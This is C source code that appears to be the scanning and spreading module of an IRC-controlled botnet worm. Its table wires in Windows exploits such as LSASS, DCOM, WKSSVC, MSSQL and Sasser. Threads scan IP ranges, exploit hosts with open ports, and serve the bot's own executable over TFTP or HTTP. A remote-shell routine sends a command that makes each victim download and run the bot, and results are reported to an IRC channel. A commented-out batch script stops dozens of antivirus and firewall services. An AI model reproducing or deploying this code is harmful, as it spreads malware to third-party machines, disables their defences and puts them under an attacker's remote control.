#include "includes.h"
#include "functions.h"
#include "externs.h"

// globals
ADVINFO advinfo[MAXTHREADS];
CRITICAL_SECTION CriticalSection; 

EXPLOIT exploit[]={
	#ifndef NO_NETBIOS
	//{"netbios", "NetBios", 139, NetBios, 0, true, false}, NBT only uses port 445
	{"ntpass", "NTPass", 445, NetBios, 0, true, false},
	#endif
	#ifndef NO_LSASS
	{"lsass", "lsass", 445, lsass, 0, true, false},
	#endif
	#ifndef NO_DCOM
	{"dcom135", "Dcom135", 135, dcom, 0, true, false},
	{"dcom445", "Dcom445", 445, dcom, 0, true, false},
	//{"dcom1025", "Dcom1025", 1025, dcom, 0, true, false}, ???
	#endif
	#ifndef NO_WKSSVC
	{"wkssvcXP", "WKSSVC_XP", 445, wkssvc, 0, true, false},
	{"wkssvcENG", "WKSSVC_Eng", 445, ScriptGod_WKSSVC_Eng, 0, true, false},
	{"wkssvcOth", "WKSSVC_Other", 445, ScriptGod_WKSSVC_Other, 0, true, false},
	#endif
	#ifndef NO_DCOM2
	{"dcom2", "Dcom2", 135, dcom2, 0, true, false},
	#endif
	#ifndef NO_DEPTH2
	{"dcass", "dcass", 445, r00t1, 0, true, false},
    #endif
	#ifndef NO_DEPTH3
	{"dcsasswks","dcsasswks", 445, r00t3, 0, true, false},
    #endif
	#ifndef NO_DEPTH5
	{"massasn", "massasn", 445, massasn, 0, true, false},
    #endif
	#ifndef NO_DEPTH6
	{"hellz", "hellz", 445, hell, 0, true, false},
    #endif
	#ifndef NO_MSSQL
	{"mssql", "MSSQL", 1433, MSSQL, 0, true, false},
	{"mssqlexec", "MSSQL_Exec", 1433, MSSQLExec, 0, true, false},
	{"mssqlauth", "MSSQL_PreAuth", 1433, MSSQLPreAuth, 0, true, false},
	{"mssqlres", "MSSQL_Res", 1433, MSSQLResolution, 0, true, false}, /*actually uses udp*/
	#endif
	#ifndef NO_MS04007ASN1
    {"asn1http", "asn1http", 80, MS04_007_MSASN1_PortedByScriptGod, 0, true, false},
    {"asn1smb", "asn1smb", 445, MS04_007_MSASN1_PortedByScriptGod, 0, true, false},
    {"asn1smbnt", "asn1smbnt",139, MS04_007_MSASN1_PortedByScriptGod, 0, true, false},
    #endif
	#ifndef NO_FTPDS
	{"ftpds", "misc_ftpds", 21, ftpds, 0, true, false},
	#endif
	#ifndef NO_SASSER
	{"sasser", "Sasser", 5554, sasser, 0, true, false},
	{"sassere", "Sasser.E", 1023, sasser, 0, true, false},
	#endif
	#ifndef NO_VERITAS
	{"veritas", "VeritasBackupServer", 6101, veritasbackupserver, 0, true, false},
	#endif
	#ifndef NO_MSMQ
	{"msmq", "MSMQ_DeleteObject", 2103, msmq, 0, true, false},
	#endif
	{NULL, NULL, 0, NULL, 0, false, false}
};

void ListExploitStats(SOCKET sock, char *chan, bool notice)
{
	char buffer[IRCLINE], buffer2[IRCLINE];

	int extotal = 0;

	sprintf(buffer, "[SCAN]: Exploit Statistics:");
	for(int i=0; exploit[i].port != 0; i++) {
		extotal += exploit[i].stats;
		sprintf(buffer2," %s: %d,",exploit[i].name,exploit[i].stats);
		strncat(buffer, buffer2, sizeof(buffer));
	}
	sprintf(buffer2, " Total: %d in %s.", extotal, Uptime(started));
	strncat(buffer, buffer2, sizeof(buffer));

	irc_privmsg(sock, chan, buffer, notice);
	addlog(buffer);

	return;
}

void currentIP(SOCKET sock, char *chan, bool notice, int threadnum)
{
	char sendbuf[IRCLINE];

	if (findthreadid(SCAN_THREAD) > 0) {
		IN_ADDR in;
		in.s_addr = advinfo[threadnum].ip;

		sprintf(sendbuf, "[SCAN]: Current IP: %s.",finet_ntoa(in));
	} else 
		sprintf(sendbuf ,"[SCAN]: Scan not active.");

	irc_privmsg(sock, chan, sendbuf, notice);
	addlog(sendbuf);

	return;
}

void CheckServers(ADVSCAN scan)
{
	char sendbuf[IRCLINE];

	DWORD id;

	if(scan.exploit != -1) {
		if (exploit[scan.exploit].tftp) {
			if (findthreadid(TFTP_THREAD) == 0) {
				static TFTP tftpd;
				tftpd.port = tftpport;
				tftpd.threads = 0;
				if (scan.payload) 
					GetLocalPayloadFile(tftpd.filename, sizeof(tftpd.filename));
				else 
					GetModuleFileName(0,tftpd.filename,sizeof(tftpd.filename));
				strncpy(tftpd.requestname, filename, sizeof(tftpd.requestname)-1);
				tftpd.sock=scan.sock;
				tftpd.notice = scan.notice;
				if (scan.msgchan[0] == '\0') {
					strncpy(tftpd.chan, scan.chan, sizeof(tftpd.chan)-1);
					tftpd.silent = true;
				} else {
					strncpy(tftpd.chan, scan.msgchan, sizeof(tftpd.chan)-1);
					tftpd.silent = false;
				}
				
				sprintf(sendbuf, "[TFTPD]: Server started on IP: %s:%d, File: %s, Request: %s.", GetIP(tftpd.sock), tftpd.port, tftpd.filename, tftpd.requestname);
				tftpd.threadnum = addthread(sendbuf,TFTP_THREAD,NULL);
				if (threads[tftpd.threadnum].tHandle = CreateThread(NULL, 0, &tftpserver, (LPVOID)&tftpd, 0, &id)) {
					while (tftpd.gotinfo == false) 
						Sleep(50);
				} else
					sprintf(sendbuf, "[TFTPD]: Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
			}
		} else if (exploit[scan.exploit].http) {
			if (findthreadid(HTTP_THREAD) == 0) {
				static HTTPD httpd;
				
				char *c;
				GetModuleFileName(0,httpd.dir,sizeof(httpd.dir));
				if ((c=strrchr(httpd.dir,'\\')) != NULL)
					*c='\0';
				httpd.port = httpport;
				httpd.enabled = false;
				sprintf(httpd.chan, scan.chan);
				httpd.sock = scan.sock;
				httpd.notice = scan.notice;
				httpd.silent = scan.silent;

				sprintf(sendbuf,"[HTTPD]: Server listening on IP: %s:%d, Directory: %s\\.", scan.myip, httpd.port, httpd.dir);

				httpd.threadnum = addthread(sendbuf,HTTP_THREAD,NULL);
				if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Server_Thread, (LPVOID)&httpd, 0, &id)) {
					while(httpd.info == false)
						Sleep(50);
				} else
					sprintf(sendbuf, "[HTTPD]: Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
			}
		}
	}

	return;
}

unsigned long AdvGetNextIP(int threadnum) {
	DWORD host;

	memcpy(&host, &advinfo[threadnum].ip, 4);
	host = fntohl(host);
	host += 1;
	host = fhtonl(host);
	memcpy(&advinfo[threadnum].ip, &host, 4);

	return (advinfo[threadnum].ip);
}

unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum) {
	int ip1=-1,ip2=-1,ip3=-1,ip4=-1;

	if (strlen(scanmask) > 15) 
		return 0;

	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();

	advinfo[threadnum].ip = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));

	return (advinfo[threadnum].ip);
}

bool AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay)
{
	SOCKADDR_IN sin;
	DWORD blockcmd=1;

	SOCKET sock = fsocket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET) 
		return false;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = fhtons((unsigned short)port);
	fioctlsocket(sock,FIONBIO,&blockcmd);
	fconnect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL timeout;
	timeout.tv_sec=delay;
	timeout.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = fselect(0,0,&rset,0,&timeout);
	fclosesocket(sock);

	if (i<=0) 
		return false;
	else 
		return true;
}

bool AdvUDPPortOpen(unsigned long ip, unsigned int port, unsigned int delay)
{
	/*UDP datagram -> Closed Port -> ICMP Port Unreachable
	  UDP datagram -> Open Port -> No Reply (or application dependent)*/

	SOCKADDR_IN sin;
	FD_SET readfd;
	TIMEVAL timeout;
	char data[1];
	BOOL error, open=0;

	SOCKET sock = fsocket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
	if (sock == INVALID_SOCKET) return false;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = fhtons(port);
	
	if (fconnect(sock,(LPSOCKADDR)&sin,sizeof(sin)) == -1) return false;

	for (int i=0; i<2; i++) {
		FD_ZERO (&readfd);
		FD_SET (sock, &readfd);
		timeout.tv_sec = delay;
		timeout.tv_usec = 0;

		fsend(sock, data, 0, 0);

		error=fselect(sock+1,&readfd,0,0,&timeout);
		if (error == SOCKET_ERROR) { open = FALSE; break; }
		else if (error == 0) { open = TRUE; break; }
		else if (error == 1) { open = (frecv(sock,data,0,0) != SOCKET_ERROR); break; }

		/* If error was 0, there was no reply; we retry for 
		a variable number of times */

		if (error != 0) break;
	}

	fclosesocket(sock);

	return (open)?(true):(false);
}

DWORD WINAPI AdvPortScanner(LPVOID param)
{
	IN_ADDR in;
	char logbuf[LOGLINE];

	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->cgotinfo = true;

	int threadnum=scan.cthreadnum;
	int threadid=scan.cthreadid;

	srand(GetTickCount()); 
	while (advinfo[threads[threadnum].parent].info) {
		DWORD dwIP;
		
		if (scan.random)
			dwIP = AdvGetNextIPRandom(scan.ip,threads[threadnum].parent);
		else
			dwIP = AdvGetNextIP(threads[threadnum].parent);
		in.s_addr = dwIP;

		sprintf(logbuf,"[SCAN]: IP: %s:%d, Scan thread: %d, Sub-thread: %d.", 
			finet_ntoa(in), scan.port, threads[threadnum].parent, threadid); 
		sprintf(threads[threadnum].name, logbuf);

		if (AdvPortOpen(dwIP, scan.port, scan.delay) == true) {
			if (scan.exploit == -1) {
				EnterCriticalSection(&CriticalSection); 

				sprintf(logbuf,"[SCAN]: IP: %s, Port %d is open.",finet_ntoa(in),scan.port);
				if (!scan.silent) {
					if (scan.msgchan[0] != '\0')
						irc_privmsg(scan.sock,scan.msgchan,logbuf,scan.notice, true);
					else
						irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, true);
				}
				addlog(logbuf);

				LeaveCriticalSection(&CriticalSection);
			} else {
				EXINFO exinfo;

				sprintf(exinfo.ip, finet_ntoa(in));
				sprintf(exinfo.myip, scan.myip);
				sprintf(exinfo.command, exploit[scan.exploit].command);
				if (scan.msgchan[0] != '\0')
					sprintf(exinfo.chan, scan.msgchan);
				else
					sprintf(exinfo.chan, scan.chan);
				exinfo.sock = scan.sock;
				exinfo.notice = scan.notice;
				exinfo.silent = scan.silent;
				exinfo.port = scan.port;
				exinfo.threadnum = threadnum;
				exinfo.exploit = scan.exploit;
				exploit[scan.exploit].exfunc(exinfo);
			}
		}
		Sleep(2000);
	}
	clearthread(threadnum);

	ExitThread(EXIT_SUCCESS);
}

DWORD WINAPI AdvScanner(LPVOID param)
{
	char buffer[LOGLINE]; 

	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->gotinfo = true;
	advinfo[scan.threadnum].ip = finet_addr(scan.ip);

	scan.payload = CopyLocalPayloadFile();

	CheckServers(scan);

	if (findthreadid(SCAN_THREAD) == 1) { // thread exists
		DeleteCriticalSection(&CriticalSection); // just in case

		if (!InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x80000400)) {
			// failed to initialize CriticalSection
			sprintf(buffer,"[SCAN]: Failed to initialize critical section.");
			if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
			addlog(buffer);

			ExitThread (EXIT_FAILURE);
		}
	}

	advinfo[scan.threadnum].info = true;
	for (unsigned int i=1;i<=(scan.threads);i++) {
		scan.cthreadid = i;
		sprintf(buffer,"[SCAN]: %s:%d, Scan thread: %d, Sub-thread: %d.",scan.ip, scan.port,scan.threadnum,scan.cthreadid); 
		scan.cthreadnum = addthread(buffer,SCAN_THREAD,NULL);
		threads[scan.cthreadnum].parent = scan.threadnum;
		if (threads[scan.cthreadnum].tHandle = CreateThread(0,0,&AdvPortScanner,(LPVOID)&scan,0,0)) {
			while (scan.cgotinfo == false)
				Sleep(30);
		} else {
			sprintf(buffer, "[SCAN]: Failed to start worker thread, error: <%d>.", GetLastError());
			addlog(buffer);
		}

		Sleep(30);
	}

	if (scan.minutes != 0)
		Sleep(60000*scan.minutes);
	else 
		while (advinfo[scan.threadnum].info == true) Sleep(2000);

	IN_ADDR in;
	in.s_addr = advinfo[scan.threadnum].ip;
	sprintf(buffer,"[SCAN]: Finished at %s:%d after %d minute(s) of scanning.", finet_ntoa(in), scan.port, scan.minutes);
	if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
	addlog(buffer);

	advinfo[scan.threadnum].info = false;
	Sleep(3000);

	if (findthreadid(SCAN_THREAD) == 1) 
		DeleteCriticalSection(&CriticalSection);

	clearthread(scan.threadnum);

	ExitThread(EXIT_SUCCESS);
}

int AdvFTPdScannerCheckHead(EXINFO exinfo) {
	int iReturn;
	SOCKET sSock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sSock != INVALID_SOCKET) {
		SOCKADDR_IN ssin;
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = fhtons(exinfo.port);
		ssin.sin_addr.s_addr = finet_addr(exinfo.ip);

		if (fconnect(sSock, (LPSOCKADDR)&ssin, sizeof(ssin)) != SOCKET_ERROR) {
			char buffer[1024], *header;
			int n;
			if((n = frecv(sSock, buffer, sizeof(buffer), 0)) > 0) {
				if (strncmp(buffer,"220",3) == 0) {
					header=buffer+strlen("220 ");
					if (_strnicmp(header,"Serv-U",6) == 0) {
						if (strstr(header, "v5")) 
							iReturn=FTP_TYPE_SERVU_5X;
						else if (strstr(header, "v4")) 
							iReturn=FTP_TYPE_SERVU_4X;
						else if (strstr(header, "v3")) 
							iReturn=FTP_TYPE_SERVU_3X;
						else
							iReturn=FTP_TYPE_SERVU;

					} else if (_strnicmp(header,"GlobalSCAPE",11) == 0) {
						if (strstr(header, "v. 3")) {
							if (strstr(header, "Secure")) 
								iReturn=FTP_TYPE_GLOBALSCAPE_SECURE_3X;
							else 
								iReturn=FTP_TYPE_GLOBALSCAPE_3X;
						} else
							if (strstr(header, "Secure")) 
								iReturn=FTP_TYPE_GLOBALSCAPE_SECURE_XX;
							else
								iReturn=FTP_TYPE_GLOBALSCAPE_XX;
					} else if (_strnicmp(header,"NetTerm FTP server",18) == 0) {
						iReturn=FTP_TYPE_NET_TERM;
					} else if (_strnicmp(header, "WS_FTP Server",13) == 0) {
						if (strstr(header, "Version 5.03"))
							iReturn=FTP_TYPE_WSFTP_503;
					} else
						iReturn=FTP_TYPE_UNKNOWN;
				}
			}
		}
		fclosesocket(sSock);
	}

	return(iReturn);
}
void GetLocalPayloadFile(char *szFullPayloadFile, size_t nSize) {
	char drive[_MAX_DRIVE], dir[_MAX_DIR], szSelfExe[MAX_PATH];

	GetModuleFileName(0, szSelfExe, MAX_PATH);
	_splitpath(szSelfExe, drive, dir, 0, 0);
	_snprintf(szFullPayloadFile, nSize, "%s%s%s", drive, dir, szLocalPayloadFile);
	return;
}
bool CopyLocalPayloadFile(void) {
	char szFullPayloadFile[MAX_PATH], szSelfExe[MAX_PATH];
	GetLocalPayloadFile(szFullPayloadFile, MAX_PATH);
	GetModuleFileName(0, szSelfExe, MAX_PATH);

	if (!FileExists(szFullPayloadFile)) {
		if (CopyFile(szSelfExe,szFullPayloadFile,false) != 0) return true;
		else return false;
	} else
		return true;
}

bool ConnectShell(EXINFO exinfo, int port) {
	SOCKET sock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sock == INVALID_SOCKET) return false;

	SOCKADDR_IN sin;
	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = finet_addr(exinfo.ip);
	sin.sin_port = fhtons((unsigned short)port);

	if(fconnect(sock, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR) return false;

	char cmd_buff[400];

	//#ifndef NO_AVIRUS
	//sprintf(cmd_buff, 
	//	"echo @echo off>cmd.bat\r\n"
	//	"echo net stop \"Symantec Proxy Service\">>cmd.bat\r\n"
	//	"echo net stop \"Symantec Event Manager\">>cmd.bat\r\n"
	//	"echo net stop \"Norton Interecho net Security Accounts Manager\">>cmd.bat\r\n"
	//	"echo net stop \"Norton AntiVirus Server\">>cmd.bat\r\n"
	//	"echo net stop \"Norton AntiVirus Auto Protect Service\">>cmd.bat\r\n"
	//	"echo net stop \"Norton AntiVirus Client\">>cmd.bat\r\n"
	//	"echo net stop \"Norton AntiVirus Corporate Edition\">>cmd.bat\r\n"
	//	"echo net stop \"ViRobot Professional Monitoring\">>cmd.bat\r\n"
	//	"echo net stop \"ViRobot Expert Monitoring\">>cmd.bat\r\n"
	//	"echo net stop \"ViRobot Lite Monitoring\">>cmd.bat\r\n"
	//	"echo net stop \"PC-cillin Personal Firewall\">>cmd.bat\r\n"
	//	"echo net stop \"Trend Micro Proxy Service\">>cmd.bat\r\n"
	//	"echo net stop \"Trend NT Realtime Service\">>cmd.bat\r\n"
	//	"echo net stop \"McAfee.com McShield\">>cmd.bat\r\n"
	//	"echo net stop \"McAfee.com VirusScan Online Realtime Engine\">>cmd.bat\r\n"
	//	"echo net stop \"McAfee Agent\">>cmd.bat\r\n"
	//	"echo net stop \"McShield\">>cmd.bat\r\n"
	//	"echo net stop \"SyGateService\">>cmd.bat\r\n"
	//	"echo net stop \"Sygate Personal Firewall Pro"
	//	"echo net stop \"Sophos Anti-Virus"
	//	"echo net stop \"Sophos Anti-Virus echo network\">>cmd.bat\r\n"
	//	"echo net stop \"DefWatch\">>cmd.bat\r\n"
	//	"echo net stop \"Ahnlab Task Scheduler\">>cmd.bat\r\n"
	//	"echo net stop \"eTrust Antivirus Job Server\">>cmd.bat\r\n"
	//	"echo net stop \"eTrust Antivirus Realtime Server\">>cmd.bat\r\n"
	//	"echo net stop \"eTrust Antivirus RPC Server\">>cmd.bat\r\n"
	//	"echo net stop \"V3MonNT\">>cmd.bat\r\n"
	//	"echo net stop \"V3MonSvc\">>cmd.bat\r\n"
	//	"echo net stop \"Quick Heal Online Protection\">>cmd.bat\r\n"
	//	"echo net stop \"Kaspersky\">>cmd.bat\r\n"
	//	"echo net stop \"Kaspersky Anti-Virus\">>cmd.bat\r\n"
	//	"echo net stop \"Kaspersky Antivirus\">>cmd.bat\r\n"
	//	"echo net stop \"Kaspersky Client\">>cmd.bat\r\n"
	//	"echo net stop \"kaspersky auto protect service\">>cmd.bat\r\n"
	//	"echo net stop \"kav\">>cmd.bat\r\n"
	//	"echo net stop \"AVG6 Service\">>cmd.bat\r\n"
	//	"echo net stop \"AVP32\">>cmd.bat\r\n"
	//	"echo net stop \"LOCKDOWN2000\">>cmd.bat\r\n"
	//	"echo net stop \"AVP.EXE\">>cmd.bat\r\n"
	//	"echo net stop \"CFIecho net32\">>cmd.bat\r\n"
	//	"echo net stop \"CFIecho net\">>cmd.bat\r\n"
	//	"echo net stop \"ICMON\">>cmd.bat\r\n"
	//	"echo net stop \"SAFEWEB\">>cmd.bat\r\n"
	//	"echo net stop \"WEBSCANX\">>cmd.bat\r\n"
	//	"echo net stop \"ANTIVIR\">>cmd.bat\r\n"
	//	"echo net stop \"MCAFEE\">>cmd.bat\r\n"
	//	"echo net stop \"NORTON\">>cmd.bat\r\n"
	//	"echo net stop \"NVC95\">>cmd.bat\r\n"
	//	"echo net stop \"FP-WIN\">>cmd.bat\r\n"
	//	"echo net stop \"IOMON98\">>cmd.bat\r\n"
	//	"echo net stop \"PCCWIN98\">>cmd.bat\r\n"
	//	"echo net stop \"F-PROT95\">>cmd.bat\r\n"
	//	"echo net stop \"F-STOPW\">>cmd.bat\r\n"
	//	"echo net stop \"PVIEW95\">>cmd.bat\r\n"
	//	"echo net stop \"NAVWNT\">>cmd.bat\r\n"
	//	"echo net stop \"NAVRUNR\">>cmd.bat\r\n"
	//	"echo net stop \"NAVLU32\">>cmd.bat\r\n"
	//	"echo net stop \"NAVAPSVC\">>cmd.bat\r\n"
	//	"echo net stop \"NISUM\">>cmd.bat\r\n"
	//	"echo net stop \"SYMPROXYSVC\">>cmd.bat\r\n"
	//	"echo net stop \"RESCUE32\">>cmd.bat\r\n"
	//	"echo net stop \"NISSERV\">>cmd.bat\r\n"
	//	"echo net stop \"ATRACK\">>cmd.bat\r\n"
	//	"echo net stop \"IAMAPP\">>cmd.bat\r\n"
	//	"echo net stop \"LUCOMSERVER\">>cmd.bat\r\n"
	//	"echo net stop \"LUALL\">>cmd.bat\r\n"
	//	"echo net stop \"NMAIN\">>cmd.bat\r\n"
	//	"echo net stop \"NAVW32\">>cmd.bat\r\n"
	//	"echo net stop \"NAVAPW32\">>cmd.bat\r\n"
	//	"echo net stop \"VSSTAT\">>cmd.bat\r\n"
	//	"echo net stop \"VSHWIN32\">>cmd.bat\r\n"
	//	"echo net stop \"AVSYNMGR\">>cmd.bat\r\n"
	//	"echo net stop \"AVCONSOL\">>cmd.bat\r\n"
	//	"echo net stop \"WEBTRAP\">>cmd.bat\r\n"
	//	"echo net stop \"POP3TRAP\">>cmd.bat\r\n"
	//	"echo net stop \"PCCMAIN\">>cmd.bat\r\n"
	//	"echo net stop \"PCCIOMON\">>cmd.bat\r\n"
	//	"cmd.bat\r\n");

	//if(fsend(sock,(char*)cmd_buff, strlen(cmd_buff),0) == SOCKET_ERROR) return false;

	//char recvbuf[64];
	//if(frecv(sock, recvbuf, sizeof(recvbuf), 0) > 0) Sleep(1000); else return false;
	//#endif

	sprintf(cmd_buff,
		"tftp -i %s GET %s & "
		"%s\r\n",
		exinfo.myip, filename, filename);

	if(fsend(sock,(char*)cmd_buff, strlen(cmd_buff),0) == SOCKET_ERROR) return false;

	fclosesocket(sock);

	return true;
}

bool AddEx(EXINFO exinfo, bool transfer) {
	bool bTransfered=false;

	if (transfer) {
		char buffer[IRCLINE];
		sprintf(buffer,"[TFTPD]: File transfer complete to IP: %s", exinfo.ip);

		for (int i=0;i < 6; i++) {
			if (searchlog(buffer)) {
				sprintf(buffer, "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
				if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
				addlog(buffer);
				exploit[exinfo.exploit].stats++;

				bTransfered=true;
				break;
			}
			Sleep(5000);
		}
	} else {
		char sendbuf[IRCLINE];
		sprintf(sendbuf, "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
		if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, sendbuf, exinfo.notice);
		addlog(sendbuf);
		exploit[exinfo.exploit].stats++;
	}
	return bTransfered;
}